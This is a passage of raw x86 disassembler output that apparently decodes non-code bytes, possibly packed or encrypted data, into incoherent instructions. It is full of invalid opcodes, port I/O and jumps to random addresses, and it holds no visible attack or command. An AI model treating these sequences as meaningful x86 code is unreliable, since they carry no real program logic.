  4153a5:	or     al,0xd9
  4153a7:	xor    DWORD PTR [eax],ebx
  4153a9:	and    al,0x8b
  4153ab:	jbe    0x4153dc
  4153ad:	rol    esi,1
  4153af:	push   ebp
  4153b0:	scas   eax,DWORD PTR es:[edi]
  4153b1:	adc    cl,dh
  4153b3:	and    BYTE PTR [ebx-0x33ae6672],0x55
  4153ba:	mov    edx,0x7238397
  4153bf:	adc    cl,BYTE PTR [edx-0x1]
  4153c2:	pop    eax
  4153c3:	loop   0x4153ca
  4153c5:	pushf  
  4153c6:	sub    al,0xd6
  4153c8:	(bad)  
  4153c9:	push   ss
  4153ca:	and    dh,bl
  4153cc:	ins    DWORD PTR es:[edi],dx
  4153cd:	pop    ebp
  4153ce:	lds    ebp,FWORD PTR [ebp+0x71]
  4153d1:	enter  0x305b,0x89
  4153d5:	sahf   
  4153d6:	arpl   WORD PTR [ebx+ebx*2-0x2fbf3a3e],sp
  4153dd:	cmp    DWORD PTR [ecx+eax*2],edi
  4153e0:	repz clc 
  4153e2:	push   eax
  4153e3:	push   esi
  4153e4:	cmp    DWORD PTR [edx+esi*8+0x63],0x79
  4153e9:	mov    esi,0xe7e8e96b
  4153ee:	adc    al,BYTE PTR [ecx+0x2b]
  4153f1:	call   0x2771be06
  4153f6:	stos   BYTE PTR es:[edi],al
  4153f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153f8:	and    al,0xe4
  4153fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153fb:	xor    al,0x84
  4153fd:	mov    eax,ds:0xc9dfd675
  415402:	fisubr DWORD PTR [ebx+0x2bd4a888]
  415408:	push   es
  415409:	out    dx,eax
  41540a:	(bad)  
  41540b:	sub    al,0x62
  41540d:	test   al,0x6
  41540f:	xchg   ecx,eax
  415410:	test   al,0xdc
  415412:	pop    es
  415413:	es call 0x454cf0de
  415419:	mov    bl,BYTE PTR [eax+eiz*2-0x28]
  41541d:	in     eax,0x7b
  41541f:	push   es
  415420:	fcomp  DWORD PTR [esp+edi*1-0x5f854645]
  415427:	fcmove st,st(4)
  415429:	int    0x3c
  41542b:	and    dh,BYTE PTR [ecx-0x294c1fa5]
  415431:	and    al,0xff
  415433:	or     eax,DWORD PTR [esi+0x7e]
  415436:	lock cdq 
  415438:	imul   ecx,DWORD PTR [esi-0x49300b45],0x3a
  41543f:	mov    WORD PTR [esi+0x43dd5c3c],?
  415445:	mov    ecx,0xfca0f59a
  41544a:	lods   al,BYTE PTR ds:[esi]
  41544b:	adc    BYTE PTR [edi],ch
  41544d:	fabs   
  41544f:	sbb    bh,dl
  415451:	cmp    edi,DWORD PTR [eax+0x5d]
  415454:	std    
  415455:	jecxz  0x415492
  415457:	cmp    eax,0x31ffabb6
  41545c:	inc    edi
  41545d:	inc    BYTE PTR [ecx+ebp*4-0x51f5bc47]
  415464:	in     eax,dx
  415465:	mov    dl,0x1e
  415467:	icebp  
  415468:	adc    eax,0x6c6e1eb0
  41546d:	retf   
  41546e:	pop    edi
  41546f:	sbb    eax,0x6d941e3b
  415474:	add    al,0x65
  415476:	cmp    BYTE PTR [ebp-0x4010f97f],bl
  41547c:	subps  xmm0,xmm4
  41547f:	xor    edx,DWORD PTR [edi-0x32]
  415482:	sar    cl,0xfc
  415485:	shr    BYTE PTR [edi-0x25f7e61c],0xe4
  41548c:	repnz mov bh,0x61
  41548f:	xchg   esp,eax
  415490:	sub    eax,0xd060437a
  415495:	frstor [edi+0x12d5d729]
  41549b:	mov    ch,0xe6
  41549d:	xor    eax,0xda44bb34
  4154a2:	pop    eax
  4154a3:	shr    DWORD PTR [esi+0x2],0x2
  4154a7:	imul   ebx,esp,0x8d119701
  4154ad:	rcr    BYTE PTR [edx],0x19
  4154b0:	loop   0x41550d
  4154b2:	pop    esi
  4154b3:	enter  0x5412,0xb2
  4154b7:	push   esi
  4154b8:	test   DWORD PTR [ecx],esp
  4154ba:	loope  0x4154a5
  4154bc:	fs lahf 
  4154be:	and    DWORD PTR [edx-0x67],0xb
  4154c2:	dec    edi
  4154c3:	call   0xf86739dc
  4154c8:	adc    ah,BYTE PTR [ebx-0x4]
  4154cb:	mov    fs,esi
  4154cd:	cld    
  4154ce:	sub    al,0x2a
  4154d0:	sbb    edi,DWORD PTR [eax-0x2c]
  4154d3:	(bad)  [edx+eax*1]
  4154d6:	rol    BYTE PTR ds:0xd1f1d4f3,1
  4154dc:	adc    DWORD PTR [ebp-0x13],ecx
  4154df:	jg     0x415495
  4154e1:	inc    eax
  4154e2:	std    
  4154e3:	int    0x7
  4154e5:	in     al,dx
  4154e6:	xlat   BYTE PTR ds:[ebx]
  4154e7:	jo     0x41548a
  4154e9:	pop    ebx
  4154ea:	cmc    
  4154eb:	les    ebp,FWORD PTR [ebx]
  4154ed:	push   edi
  4154ee:	xor    BYTE PTR [edx+0xbf82f03],dh
  4154f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f5:	fiadd  DWORD PTR ds:0xee17cc52
  4154fb:	shr    DWORD PTR [esi],0xdd
  4154fe:	adc    cl,BYTE PTR [ecx-0x5a0f9858]
  415504:	jge    0x41551b
  415506:	test   DWORD PTR [ecx+edi*2+0x63],ecx
  41550a:	loopne 0x415502
  41550c:	sub    ebp,ebp
  41550e:	es pop ss
  415510:	addr16 (bad) 
  415513:	into   
  415514:	(bad)  
  415516:	clc    
  415517:	jb     0x4154c7
  415519:	mov    ebx,0x272fd66e
  41551e:	repz inc ebp
  415520:	shr    BYTE PTR [ecx+eax*2+0x6b1d0792],cl
  415527:	test   BYTE PTR [eax-0x730695ed],cl
  41552d:	and    DWORD PTR [ebx-0x5],0x6cbdb985
  415534:	test   eax,0xba6ecdea
  415539:	xchg   edi,eax
  41553a:	mov    cl,0xf0
  41553c:	icebp  
  41553d:	nop
  41553e:	lock rcl DWORD PTR [ecx+0x5c2cfbe2],1
  415545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415546:	mov    ebp,ebx
  415548:	dec    eax
  415549:	mov    dl,0xf6
  41554b:	daa    
  41554c:	pop    eax
  41554d:	mov    bh,0x65
  41554f:	mov    dl,0x7e
  415551:	lea    eax,[ebp+0x95d216a]
  415557:	dec    edi
  415558:	jae    0x4155c4
  41555a:	mov    ds:0xa6dc78fc,al
  41555f:	dec    edi
  415560:	in     eax,dx
  415561:	test   BYTE PTR [ebp-0x1728e351],dh
  415567:	ficom  DWORD PTR [edi-0x433285b1]
  41556d:	jecxz  0x415514
  41556f:	push   0xb493509d
  415574:	das    
  415575:	and    BYTE PTR [ecx+0x75],bl
  415578:	loope  0x415553
  41557a:	and    al,0xcb
  41557c:	xor    esp,DWORD PTR [ebx]
  41557e:	pushf  
  41557f:	pop    edi
  415580:	int3   
  415581:	aaa    
  415582:	imul   eax,DWORD PTR [ebx+0x7c],0x1f
  415586:	sub    dl,dh
  415588:	adc    dl,BYTE PTR [edx+0x6f403307]
  41558e:	jns    0x41557f
  415590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415591:	xchg   edi,eax
  415592:	jne    0x4155c3
  415594:	dec    esi
  415595:	dec    ebp
  415596:	cli    
  415597:	xor    al,0x7e
  415599:	aam    0x2c
  41559b:	retf   0x946
  41559e:	data16 daa 
  4155a0:	xchg   edx,eax
  4155a1:	dec    edx
  4155a2:	pop    ds
  4155a3:	mov    cl,0x8b
  4155a5:	push   edx
  4155a6:	test   eax,0x5f8df84f
  4155ab:	and    BYTE PTR [bp+si+0x70],cl
  4155af:	in     al,dx
  4155b0:	mov    WORD PTR cs:[eax],es
  4155b3:	sti    
  4155b4:	mov    ecx,0xaddbcc52
  4155b9:	lods   al,BYTE PTR ds:[esi]
  4155ba:	aaa    
  4155bb:	mov    eax,0x4dba1415
  4155c0:	jbe    0x41562d
  4155c2:	fiadd  DWORD PTR [eax]
  4155c4:	inc    ebp
  4155c5:	mov    eax,0xe4987673
  4155ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155cc:	fdivr  st(2),st
  4155ce:	call   0xdb31:0x2c86b022
  4155d5:	add    BYTE PTR [edx+0x21cb951a],ch
  4155db:	pop    edx
  4155dc:	or     edx,ebp
  4155de:	xor    eax,0xb7970388
  4155e3:	daa    
  4155e4:	bound  esp,QWORD PTR [ecx]
  4155e6:	jno    0x41557f
  4155e8:	jnp    0x41557c
  4155ea:	dec    ebx
  4155eb:	push   ds
  4155ec:	jg     0x415656
  4155ee:	xchg   edx,eax
  4155ef:	jne    0x4155f4
  4155f1:	xchg   esp,eax
  4155f2:	sbb    bl,BYTE PTR [ebp+0x4fa68206]
  4155f8:	std    
  4155f9:	mov    ecx,0x1477d355
  4155fe:	jg     0x4155e7
  415600:	push   0x41
  415602:	out    0xf7,al
  415604:	adc    DWORD PTR [ecx+0xd],eax
  415607:	jne    0x41562a
  415609:	mov    cl,0xc7
  41560b:	rol    BYTE PTR [ebx-0x33b56947],0xfa
  415612:	leave  
  415613:	sti    
  415614:	bound  ebx,QWORD PTR [ebp+0x7c]
  415617:	ret    
  415618:	pop    ebp
  415619:	jns    0x415646
  41561b:	jge    0x415614
  41561d:	and    eax,0x8dad365f
  415622:	not    BYTE PTR [edi+0x52]
  415625:	out    0x52,eax
  415627:	cmp    dl,BYTE PTR [eax+0x73]
  41562a:	imul   eax,esp,0x3ef715c8
  415630:	lahf   
  415631:	test   DWORD PTR [edx],edi
  415633:	push   ss
  415634:	retf   0xc4d9
  415637:	mov    cl,BYTE PTR [esi+0x5477d889]
  41563d:	sub    cl,BYTE PTR [ecx]
  41563f:	repz jnp 0x41566f
  415642:	mov    ebx,0x6adf82fe
  415647:	mov    esp,0x962f39f5
  41564c:	dec    edi
  41564d:	jne    0x41560a
  41564f:	push   0xce553c86
  415654:	sbb    al,0x99
  415656:	ss mov al,0x3a
  415659:	and    ebx,DWORD PTR [ebp-0x735aa736]
  41565f:	test   al,0x69
  415661:	aaa    
  415662:	xchg   esp,eax
  415663:	xchg   edi,esp
  415665:	shl    BYTE PTR [esp+edi*8+0x28],1
  415669:	test   DWORD PTR [eax],0x93bd5206
  41566f:	xor    ah,BYTE PTR [esp+esi*2+0x67cf24a3]
  415676:	cli    
  415677:	push   0xc
  415679:	mov    fs,WORD PTR [edi]
  41567b:	jmp    0x415604
  41567d:	lock rcr DWORD PTR [ecx+0x6],cl
  415681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415682:	xchg   esp,eax
  415683:	loope  0x41567a
  415685:	lods   al,BYTE PTR cs:[esi]
  415687:	sti    
  415688:	cli    
  415689:	fadd   QWORD PTR [esi]
  41568b:	test   BYTE PTR [ebp+0x5e],dh
  41568e:	dec    ebx
  41568f:	cmp    DWORD PTR [ebx],esi
  415691:	aam    0xac
  415693:	jae    0x415636
  415695:	ins    DWORD PTR es:[edi],dx
  415696:	or     edx,esp
  415698:	in     eax,0x82
  41569a:	(bad)  
  41569b:	int3   
  41569c:	or     al,0x7e
  41569e:	fstp   QWORD PTR [ecx+0xbecfd61]
  4156a4:	jmp    0x415694
  4156a6:	mov    edi,0xd13baa9a
  4156ab:	push   ds
  4156ac:	lods   al,BYTE PTR ds:[esi]
  4156ad:	std    
  4156ae:	daa    
  4156af:	lock scas al,BYTE PTR es:[edi]
  4156b1:	aaa    
  4156b2:	and    BYTE PTR [ecx-0x3f],dh
  4156b5:	jmp    0x3090653f
  4156ba:	outs   dx,DWORD PTR ds:[esi]
  4156bb:	mov    ebx,0x815c41e4
  4156c0:	and    bh,BYTE PTR [esi-0x2e3d0574]
  4156c6:	jmp    0x415660
  4156c8:	data16 adc dl,BYTE PTR [edx-0x505ea5df]
  4156cf:	clc    
  4156d0:	imul   edi,DWORD PTR [esi-0x61],0xffffffcf
  4156d4:	sub    ah,BYTE PTR [ecx+0x3c9d42ef]
  4156da:	cmp    DWORD PTR [esi+0x30],0x297651bd
  4156e1:	add    ebx,DWORD PTR [edx+0x68ac6502]
  4156e7:	pop    es
  4156e8:	mov    ds:0x8f9a102,al
  4156ed:	hlt    
  4156ee:	sub    eax,0x7c9389f
  4156f3:	push   0xb56317fb
  4156f8:	pop    eax
  4156f9:	xor    al,0xe8
  4156fb:	sbb    dh,BYTE PTR [ebp+0x68]
  4156fe:	mov    eax,ds:0x61ebd271
  415703:	cmp    eax,0x44666e71
  415708:	out    0x6c,al
  41570a:	clc    
  41570b:	(bad)  
  41570c:	sbb    ebx,DWORD PTR [edi-0x1a4f3c99]
  415712:	fs (bad) 
  415714:	mov    al,0xa
  415716:	outs   dx,BYTE PTR ds:[esi]
  415717:	mov    ds:0xcfc96748,eax
  41571c:	xchg   ebx,eax
  41571d:	sub    DWORD PTR [edx],0xd62d6c95
  415723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415724:	scas   al,BYTE PTR es:[edi]
  415725:	nop
  415726:	jns    0x4156c7
  415728:	fbld   TBYTE PTR [ebp-0x6b4cd94b]
  41572e:	xlat   BYTE PTR ds:[ebx]
  41572f:	xor    BYTE PTR [ecx],ah
  415731:	aad    0x7f
  415733:	in     eax,0xf
  415735:	shr    DWORD PTR [ebx+0x6a],1
  415738:	jp     0x415726
  41573a:	lahf   
  41573b:	leave  
  41573c:	push   ebp
  41573d:	call   0x2e22:0x76eced35
  415744:	add    al,0xa2
  415746:	cmp    cl,BYTE PTR [esi+0x45b482ae]
  41574c:	shr    BYTE PTR [eax+0x7a],cl
  41574f:	jae    0x415779
  415751:	stc    
  415752:	imul   esp,DWORD PTR [esi-0x7f02225e],0xc4c8824a
  41575c:	add    eax,0xa88e052d
  415761:	out    0x49,al
  415763:	add    DWORD PTR es:0x7d5cf615,eax
  41576a:	inc    ebp
  41576b:	shl    al,cl
  41576d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576e:	shl    DWORD PTR [ebp+0x5e],1
  415771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415772:	dec    esp
  415773:	sti    
  415774:	and    edi,DWORD PTR [edx-0x31e986b6]
  41577a:	adc    dl,cl
  41577c:	fsubr  QWORD PTR ss:[edx-0x11]
  415780:	sub    ch,BYTE PTR [ebx-0x35f7fbe8]
  415786:	push   edx
  415787:	retf   
  415788:	push   es
  415789:	xchg   ebx,eax
  41578a:	and    al,0xae
  41578c:	mov    es,WORD PTR [ebp+0x67]
  41578f:	iret   
  415790:	mov    esi,0xf34eadd
  415795:	and    ebx,DWORD PTR [ebx-0x3d]
  415798:	ret    0x5366
  41579b:	push   eax
  41579c:	pusha  
  41579d:	add    ecx,esp
  41579f:	rcl    DWORD PTR [ecx+0x583acf6],1
  4157a5:	inc    esp
  4157a6:	jbe    0x41574b
  4157a8:	loope  0x415777
  4157aa:	push   es
  4157ab:	or     edx,ecx
  4157ad:	dec    ecx
  4157ae:	sbb    ecx,edx
  4157b0:	cmp    DWORD PTR [ebx+0x5b8c1515],ecx
  4157b6:	pop    ebp
  4157b7:	sub    eax,0x1147c677
  4157bc:	cdq    
  4157bd:	inc    esi
  4157be:	cmp    DWORD PTR [edx-0x7dd3c62f],edx
  4157c4:	(bad)  
  4157c6:	dec    esi
  4157c7:	ja     0x415778
  4157c9:	pop    esi
  4157ca:	fbld   TBYTE PTR [eax-0x2]
  4157cd:	js     0x415773
  4157cf:	jp     0x415817
  4157d1:	stos   DWORD PTR es:[edi],eax
  4157d2:	xchg   esp,eax
  4157d3:	adc    al,0x1
  4157d5:	mov    eax,ds:0xa9202038
  4157da:	sub    bl,BYTE PTR [eax]
  4157dc:	data16 ficomp DWORD PTR [ebp+0x3382f5d3]
  4157e3:	je     0x415847
  4157e5:	inc    ecx
  4157e6:	int    0x6
  4157e8:	jmp    0xdfc9160c
  4157ed:	lea    ebx,[ebp-0x48ccee5a]
  4157f3:	js     0x41584a
  4157f5:	call   0xb1eea661
  4157fa:	inc    ebp
  4157fb:	in     al,dx
  4157fc:	scas   al,BYTE PTR es:[edi]
  4157fd:	rcl    eax,0xc3
  415800:	repz (bad) 
  415803:	pop    ds
  415804:	pop    edx
  415805:	dec    eax
  415806:	outs   dx,DWORD PTR ds:[esi]
  415807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415808:	push   esi
  415809:	and    BYTE PTR [edx+esi*2+0x7835efb0],ch
  415810:	into   
  415811:	leave  
  415812:	sbb    al,0xd
  415814:	pop    ebx
  415815:	ret    
  415816:	xchg   BYTE PTR [esi-0x3f],bh
  415819:	inc    esi
  41581a:	mov    eax,ds:0x4794e23e
  41581f:	dec    esp
  415820:	sbb    al,0xe1
  415822:	push   ebx
  415823:	jmp    0x7ebb5e47
  415828:	fstp   DWORD PTR [ebx-0x4c37377d]
  41582e:	sub    eax,DWORD PTR [edi+0x5a]
  415831:	or     ah,BYTE PTR [ecx]
  415833:	test   al,0x24
  415835:	add    cl,BYTE PTR [ebx+0x3600fcde]
  41583b:	pop    ss
  41583c:	int3   
  41583d:	sahf   
  41583e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41583f:	jp     0x4158bc
  415841:	leave  
  415842:	xor    DWORD PTR [edx+ebp*2-0x78d5d062],ecx
  415849:	xor    cl,BYTE PTR [edi-0x6a]
  41584c:	push   eax
  41584d:	inc    ebp
  41584e:	jne    0x41586c
  415850:	loopne 0x4158b2
  415852:	loope  0x415867
  415854:	push   ds
  415855:	data16 jne 0x41584c
  415858:	ret    0x85a5
  41585b:	jge    0x41587d
  41585d:	pop    esi
  41585e:	call   0xd14001f
  415863:	sub    al,0x83
  415865:	cmc    
  415866:	repnz pop es
  415868:	xchg   esi,eax
  415869:	sbb    BYTE PTR [esi],0xba
  41586c:	ret    
  41586d:	cmp    al,0xa6
  41586f:	loop   0x4157fe
  415871:	je     0x415853
  415873:	fisubr WORD PTR [ecx-0x4e]
  415876:	fdivr  DWORD PTR [edi+0x1ee3b0d6]
  41587c:	mov    dl,0xfc
  41587e:	jl     0x4158ef
  415880:	addr16 mov al,0x89
  415883:	fsubp  st(5),st
  415885:	cmp    ch,BYTE PTR [edi+edi*8-0x52e58a2]
  41588c:	push   edx
  41588d:	addr16 pop edx
  41588f:	jg     0x415872
  415891:	mov    cl,0xbb
  415893:	mov    al,ds:0x56ba1e27
  415898:	push   ds
  415899:	mov    esi,0xd2ac5fbf
  41589e:	sar    cl,1
  4158a0:	shl    dl,cl
  4158a2:	pop    ecx
  4158a3:	mov    eax,ds:0xa6e7303e
  4158a8:	pushf  
  4158a9:	add    al,bl
  4158ab:	dec    edx
  4158ac:	rcr    DWORD PTR ds:0x35c3ff61,0x21
  4158b3:	xchg   edi,eax
  4158b4:	(bad)  
  4158b5:	ss xchg esp,eax
  4158b7:	rcl    DWORD PTR [ecx],1
  4158b9:	test   BYTE PTR [eax+0x61],bh
  4158bc:	(bad)
  4158c0:	push   cs
  4158c1:	mov    ebx,0x6fcf0a45
  4158c6:	inc    edi
  4158c7:	bound  ebp,QWORD PTR [ecx+0x16b927ca]
  4158cd:	sar    BYTE PTR [ebx-0x2e0e2956],1
  4158d3:	xor    ebp,ebp
  4158d5:	data16 jmp 0x415890
  4158d8:	cmp    al,BYTE PTR [ebp+0x9]
  4158db:	add    eax,0x665ee79c
  4158e0:	fdivr  QWORD PTR [edx-0x32ada5d]
  4158e6:	frstor [edi+0x7287d427]
  4158ec:	repnz iret 
  4158ee:	inc    BYTE PTR [ebx-0xd]
  4158f1:	push   es
  4158f2:	ins    DWORD PTR es:[edi],dx
  4158f3:	fcmovb st,st(3)
  4158f5:	nop
  4158f6:	or     eax,0xfcee2cb1
  4158fb:	lods   al,BYTE PTR ds:[esi]
  4158fc:	(bad)  
  4158fd:	ds jnp 0x415961
  415900:	shl    BYTE PTR [ecx-0x6a],0x98
  415904:	add    edi,DWORD PTR [ebp-0xa411f89]
  41590a:	or     al,0x72
  41590c:	sub    ebp,DWORD PTR [edi+0x38cd6629]
  415912:	mov    BYTE PTR [edi],dh
  415914:	hlt    
  415915:	addr16 add eax,0xc984183e
  41591b:	test   DWORD PTR [esi-0x6ba95fde],ebp
  415921:	imul   ecx,DWORD PTR [ebp+ebx*2-0x48],0xffffffae
  415926:	imul   esp,DWORD PTR [eax+0x4d],0xffffffda
  41592a:	push   ecx
  41592b:	add    BYTE PTR [edi+edx*8-0x4998a262],0x45
  415933:	out    0x8a,eax
  415935:	enter  0x9c45,0x82
  415939:	and    ch,dh
  41593b:	test   DWORD PTR [ebp+0x165e09e6],eax
  415941:	int    0x8e
  415943:	dec    esi
  415944:	or     DWORD PTR [ecx+0x777dfbf8],esp
  41594a:	mov    bh,0x24
  41594c:	lods   al,BYTE PTR cs:[esi]
  41594e:	sbb    ecx,DWORD PTR [ebx-0xf]
  415951:	std    
  415952:	pop    ds
  415953:	rol    DWORD PTR [ebp*4+0x4d9ff147],cl
  41595a:	sbb    BYTE PTR [ebx+0x72],ch
  41595d:	lock xchg edi,eax
  41595f:	int    0xe6
  415961:	add    esi,DWORD PTR [edx-0x3c840fd4]
  415967:	adc    DWORD PTR [ebp-0x4ee4a5ed],esi
  41596d:	jg     0x415955
  41596f:	std    
  415970:	in     al,0x6c
  415972:	sti    
  415973:	test   BYTE PTR [ebx+0x4c],bh
  415976:	popf   
  415977:	popf   
  415978:	and    ah,BYTE PTR [esi+0x2f]
  41597b:	mov    edx,0xc7429f30
  415980:	call   0x6d64eb62
  415985:	sahf   
  415986:	rcr    BYTE PTR [ebx+edi*4-0x4f],0x55
  41598b:	push   ebx
  41598c:	push   cs
  41598d:	pop    edi
  41598e:	ss and eax,0x6c3667cd
  415994:	or     eax,DWORD PTR [edi]
  415996:	sbb    eax,0x1aaa184f
  41599b:	and    eax,0x887b0170
  4159a0:	scas   al,BYTE PTR es:[edi]
  4159a1:	sti    
  4159a2:	or     eax,0x340af1
  4159a7:	jl     0x4159bc
  4159a9:	jnp    0x41592c
  4159ab:	sub    BYTE PTR [edx],dh
  4159ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159ae:	neg    dh
  4159b0:	xor    al,0xd9
  4159b2:	mov    dl,BYTE PTR ds:0x78b90c1d
  4159b8:	jge    0x4159b4
  4159ba:	cmc    
  4159bb:	retf   
  4159bc:	cdq    
  4159bd:	inc    eax
  4159be:	xchg   ecx,eax
  4159bf:	test   eax,0x91a6a8e7
  4159c4:	mov    ch,0xf
  4159c6:	cs mov ah,0xbc
  4159c9:	stc    
  4159ca:	shl    BYTE PTR [eax],cl
  4159cc:	cmp    eax,0x504724f1
  4159d1:	pushf  
  4159d2:	xor    DWORD PTR [eax+edx*1+0x2b6c8fb5],edi
  4159d9:	out    dx,al
  4159da:	sti    
  4159db:	sub    DWORD PTR cs:[edi+ecx*8],esi
  4159df:	sub    edi,DWORD PTR [ebp-0x1d82aca1]
  4159e5:	xchg   esp,eax
  4159e6:	hlt    
  4159e7:	mov    bh,ch
  4159e9:	add    bh,BYTE PTR [ecx]
  4159eb:	adc    ebx,DWORD PTR [eax+0x3f3806f0]
  4159f1:	fld    TBYTE PTR [ebx+edi*1-0x3e]
  4159f5:	xor    BYTE PTR [edi],bh
  4159f7:	adc    ch,ah
  4159f9:	add    DWORD PTR [edi-0x67c9082f],ebp
  4159ff:	sub    ebx,eax
  415a01:	shl    BYTE PTR [eax],1
  415a03:	cs pusha 
  415a05:	mov    ch,0x50
  415a07:	jnp    0x4159b4
  415a09:	fs inc edx
  415a0b:	repz ret 0x2502
  415a0f:	xlat   BYTE PTR ds:[ebx]
  415a10:	data16 jne 0x41599c
  415a13:	jge    0x415a7f
  415a15:	cmp    dh,BYTE PTR [edx+eiz*8-0x18]
  415a19:	and    al,0xeb
  415a1b:	sbb    al,0x2e
  415a1d:	imul   esi,esp,0x311cc7de
  415a23:	lahf   
  415a24:	mov    eax,ecx
  415a26:	xor    eax,0xd29f971d
  415a2b:	and    ebx,esp
  415a2d:	fisttp DWORD PTR [eax+edi*2-0x6bbd9c79]
  415a34:	push   0xdade1a7c
  415a39:	pop    edx
  415a3a:	cli    
  415a3b:	lods   al,BYTE PTR ds:[esi]
  415a3c:	push   esi
  415a3d:	in     eax,dx
  415a3e:	shl    bl,0xbb
  415a41:	xchg   esp,eax
  415a42:	mul    DWORD PTR [eax-0x56065eea]
  415a48:	(bad)  gs:[edx+0x6e]
  415a4c:	and    eax,0xa2f3c52b
  415a51:	mov    esi,0x196f4ea1
  415a56:	fimul  DWORD PTR [eax-0x22]
  415a59:	or     DWORD PTR [ebx-0x3cd07534],esp
  415a5f:	push   ds
  415a60:	adc    edi,DWORD PTR [esp+edx*4]
  415a63:	adc    esi,DWORD PTR [ecx+0x65]
  415a66:	inc    ecx
  415a67:	ret    
  415a68:	xlat   BYTE PTR ds:[ebx]
  415a69:	shl    BYTE PTR [ecx-0x5],1
  415a6c:	repz jle 0x415ae4
  415a6f:	jnp    0x415a83
  415a71:	push   edx
  415a72:	mov    al,0x7f
  415a74:	pop    ebp
  415a75:	xchg   edx,eax
  415a76:	(bad)  
  415a77:	aad    0xfb
  415a79:	xor    ecx,DWORD PTR [bx+di+0x701b]
  415a7e:	jle    0x415a93
  415a80:	enter  0xac3d,0xa4
  415a84:	and    esp,edi
  415a86:	(bad)  
  415a87:	jns    0x415a1b
  415a89:	dec    ecx
  415a8a:	and    al,0x46
  415a8c:	fs dec eax
  415a8e:	inc    edx
  415a8f:	jb     0x415aca
  415a91:	adc    DWORD PTR [eax],edi
  415a93:	stos   DWORD PTR es:[edi],eax
  415a94:	outs   dx,DWORD PTR ds:[esi]
  415a95:	in     eax,dx
  415a96:	cmp    DWORD PTR [esi],0xb81d0745
  415a9c:	scas   eax,DWORD PTR es:[edi]
  415a9d:	xor    eax,0x67c8eb92
  415aa2:	hlt    
  415aa3:	dec    edi
  415aa4:	or     DWORD PTR [edx],ebp
  415aa6:	ss inc eax
  415aa8:	mov    ebx,0x1fefa894
  415aad:	aas    
  415aae:	les    edi,FWORD PTR [ecx+eiz*4-0x6dc7a95]
  415ab5:	hlt    
  415ab6:	xor    edi,ebx
  415ab8:	and    eax,0xcd97e821
  415abd:	imul   edx,edx,0x12ef066f
  415ac3:	in     eax,0x36
  415ac5:	out    0x38,eax
  415ac7:	dec    edx
  415ac8:	push   ebx
  415ac9:	sbb    ax,0xb5a5
  415acd:	pop    esi
  415ace:	fstp   QWORD PTR [esi+esi*4+0x342bdb60]
  415ad5:	into   
  415ad6:	loopne 0x415ab1
  415ad8:	sti    
  415ad9:	jl     0x415b47
  415adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415adc:	in     eax,dx
  415add:	iret   
  415ade:	test   eax,0x558357be
  415ae3:	adc    al,0xe9
  415ae5:	cmpxchg DWORD PTR [ebp+0x223707b1],edx
  415aec:	inc    ebp
  415aed:	(bad)  
  415aee:	cmp    ch,BYTE PTR [edi]
  415af0:	add    eax,DWORD PTR [eax-0x7]
  415af3:	push   0xb1c02ea1
  415af8:	js     0x415aee
  415afa:	call   0x1210ea6d
  415aff:	xchg   esp,eax
  415b00:	mov    eax,0x9c3d7365
  415b05:	(bad)  [esi+0xc]
  415b08:	sbb    edx,DWORD PTR [eax-0x429e5906]
  415b0e:	popa   
  415b0f:	cmp    eax,0xd5b15462
  415b14:	test   al,0x7
  415b16:	lock dec ebp
  415b18:	and    al,0xad
  415b1a:	add    al,0xe0
  415b1c:	adc    eax,0xd9bcbe30
  415b21:	sbb    DWORD PTR [eax+edx*1+0x27],esi
  415b25:	and    ebp,DWORD PTR [eax-0x80]
  415b28:	cmp    ebp,DWORD PTR [edx+0x17cb02bd]
  415b2e:	test   eax,0x4ece703e
  415b33:	in     al,dx
  415b34:	data16 fcmovne st,st(1)
  415b37:	add    dl,BYTE PTR [edi]
  415b39:	icebp  
  415b3a:	shr    BYTE PTR [esi-0x6a],cl
  415b3d:	jne    0x415b26
  415b3f:	imul   esp,DWORD PTR [edi],0x7ac2bfc1
  415b45:	sub    al,0xdc
  415b47:	div    DWORD PTR [ecx+0x2b0a06fa]
  415b4d:	jl     0x415bce
  415b4f:	xchg   esp,eax
  415b50:	pop    ebp
  415b51:	mov    edx,0x185837b3
  415b56:	cdq    
  415b57:	push   es
  415b58:	inc    edx
  415b59:	ins    DWORD PTR es:[edi],dx
  415b5a:	sub    eax,0xfee7a489
  415b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b60:	adc    eax,0xc8336242
  415b65:	bound  edi,QWORD PTR ds:0x5d35a0b4
  415b6b:	jae    0x415bcf
  415b6d:	sbb    al,BYTE PTR [ebp-0x23a35fb7]
  415b73:	inc    edx
  415b74:	(bad)  
  415b75:	cmp    al,0x5e
  415b77:	jmp    0x415b2d
  415b79:	sub    al,BYTE PTR [edi+0x52474d60]
  415b7f:	rol    BYTE PTR [ebx+0x286da7aa],cl
  415b85:	aam    0x22
  415b87:	or     DWORD PTR [edx],esp
  415b89:	cmp    BYTE PTR ds:0x5ba5d296,cl
  415b8f:	add    bh,BYTE PTR [ecx]
  415b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b92:	mov    dl,0x3e
  415b95:	jae    0x415bf7
  415b97:	sub    DWORD PTR [ebx+0x5],eax
  415b9a:	inc    esp
  415b9b:	vmovlpd xmm6,xmm6,QWORD PTR [esi+0x28]
  415ba0:	pop    ds
  415ba1:	lods   eax,DWORD PTR ds:[esi]
  415ba2:	ins    BYTE PTR es:[edi],dx
  415ba3:	call   0x5f28:0x6a56a412
  415baa:	enter  0xb3ad,0x35
  415bae:	aas    
  415baf:	xchg   esi,eax
  415bb0:	jmp    0x79e691fa
  415bb5:	pop    ebx
  415bb6:	std    
  415bb7:	dec    edi
